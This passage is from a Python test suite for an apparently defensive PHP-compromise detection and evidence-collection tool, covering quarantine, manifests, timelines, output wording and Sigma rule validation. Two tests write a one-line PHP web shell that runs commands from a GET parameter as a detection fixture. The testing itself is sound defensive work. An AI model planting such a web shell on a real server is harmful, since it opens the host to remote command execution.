            bad = os.path.join(d, "shell.php")
            with open(bad, "w") as fh:
                fh.write("<?php system($_GET['c']);")
            rep = aii.Report(SINCE, 15)
            rep.flag(bad, "webshell heuristic match")
            rep.flag(os.path.join(d, "missing.php"), "gone")
            out = os.path.join(d, "bundle.tar.gz")
            added, skipped = aii.collect_evidence(out, rep, None, {}, "{}")
            self.assertEqual((added, skipped), (1, 1))
            self.assertEqual(oct(os.stat(out).st_mode & 0o777), "0o600")
            with tarfile.open(out) as tar:
                names = tar.getnames()
                self.assertIn("MANIFEST.sha256", names)
                self.assertIn("README.txt", names)
                quarantined = [n for n in names if n.startswith("flagged/")]
                self.assertEqual(len(quarantined), 1)
                self.assertTrue(quarantined[0].endswith("shell.php.quarantine"))
                self.assertEqual(tar.getmember(quarantined[0]).mode, 0o400)
                manifest = tar.extractfile("MANIFEST.sha256").read().decode()
                self.assertIn("original=" + bad, manifest)
                self.assertIn("reason=webshell heuristic match", manifest)

    def test_cli_collect_and_timeline(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "shell.php"), "w") as fh:
                fh.write("<?php system($_GET['c']);")
            out = os.path.join(d, "ev.tar.gz")
            r = subprocess.run([sys.executable, TOOL, "--no-procs", "--no-persistence", "--no-journal", "--no-exec",
                                "--no-integrity", "--no-logs", "--no-color", "--since", "2026-01-01",
                                "--webroot", d, "--collect", out, "--timeline"], capture_output=True, text=True)
            self.assertTrue(r.returncode & 4)
            self.assertTrue(os.path.exists(out))
            self.assertIn("TIMELINE", r.stdout)
            self.assertIn("fs_webshell", r.stdout)
            self.assertIn("Evidence bundle written", r.stderr)


class OutputTests(unittest.TestCase):
    def test_text_report_never_claims_clean(self):
        r = subprocess.run([sys.executable, TOOL, "--no-procs", "--no-persistence", "--no-journal", "--no-exec",
                            "--no-integrity", "--no-logs", "--no-fs", "--no-color"], capture_output=True, text=True)
        self.assertIn("NOT proof", r.stdout)
        self.assertNotIn("CLEAN", r.stdout.upper().replace("NOT PROOF THAT THE SYSTEM IS CLEAN", ""))

    def test_json_shape(self):
        _code, rep = run_tool("--no-logs", "--no-fs")
        for key in ("tool", "version", "cve", "fixed_versions", "findings", "timeline", "coverage",
                    "notes", "limitations", "exit_code"):
            self.assertIn(key, rep)
        self.assertEqual(rep["fixed_versions"], ["8.2.35", "8.3.36", "8.4.27", "8.5.12"])


class RobustnessTests(unittest.TestCase):
    def test_module_crash_does_not_abort(self):
        rep = aii.Report(SINCE, 15)

        def boom():
            raise RuntimeError("kaboom")
        self.assertIsNone(aii.run_module(rep, "demo", boom))
        self.assertIn("Module 'demo' failed", rep.notes[0])
        self.assertEqual(aii.run_module(rep, "ok", lambda: 42), 42)


class SigmaRuleTests(unittest.TestCase):
    def test_rules_are_valid_yaml_with_required_fields(self):
        try:
            import yaml
        except ImportError:
            self.skipTest("PyYAML not installed")
        rules_dir = os.path.join(HERE, "sigma")
        if not os.path.isdir(rules_dir):
            self.skipTest("sigma/ not present")
        files = [f for f in os.listdir(rules_dir) if f.endswith(".yml")]
        self.assertGreaterEqual(len(files), 4)
        seen_ids = set()
        for fn in files:
            with open(os.path.join(rules_dir, fn)) as fh:
                rule = yaml.safe_load(fh)
            for key in ("title", "id", "status", "description", "logsource", "detection", "level"):
                self.assertIn(key, rule, f"{fn}: {key}")
            self.assertIn("condition", rule["detection"], fn)
            self.assertNotIn(rule["id"], seen_ids)
            seen_ids.add(rule["id"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
